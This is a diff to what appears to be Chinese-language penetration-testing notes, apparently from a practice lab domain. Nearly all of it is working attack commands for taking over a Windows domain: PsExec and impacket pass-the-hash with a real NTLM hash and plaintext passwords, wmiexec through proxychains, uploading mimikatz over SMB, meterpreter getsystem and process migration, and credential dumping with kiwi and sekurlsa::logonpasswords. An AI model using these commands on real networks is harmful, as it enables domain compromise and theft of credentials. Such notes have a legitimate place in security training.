@@ -28,6 +28,25 @@ PsExec.exe \\192.168.52.138 -u god\administrator -p hongrisec@2022 -s cmd #成�
 # impact: pip install impacket, win下pyexec用对应的py文件 python psexec.py xxxxxxx
 psexec -hashes :8c535a2d84c3b21059d667639bb89db5 god/administrator@192.168.52.138 #成功，拿下域控了。
 psexec -hashes :8c535a2d84c3b21059d667639bb89db5 god/administrator@192.168.52.141 #成功，拿下域控了。
+# impact: 连接cmd
+proxychains python3 wmiexec.py 'administrator:123qwe!ASD@192.168.93.20'
+# smbclient 上传文件
+proxychains smbclient //192.168.93.20/c$ -U administrator%password
+smb > put mimikatz.exe # 上传文件
+# msf meterpreter
+meterpreter > getsystem
+meterpreter > getuid
+meterpreter > ps     # 非system时, 查看system权限进程，迁移
+meterpreter > migrate 216
+meterpreter > load kiwi  # 读取密码, 如果是64位的迁移到64位进程才能看明文
+meterpreter > getsystem
+meterpreter > creds_kerberos
+
+# mimikatz
+mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords" "exit" > log.log
+
+
+
 
 win7共享给域控
 copy c:\phpstudy\srn7final.exe \\192.168.52.138\c$
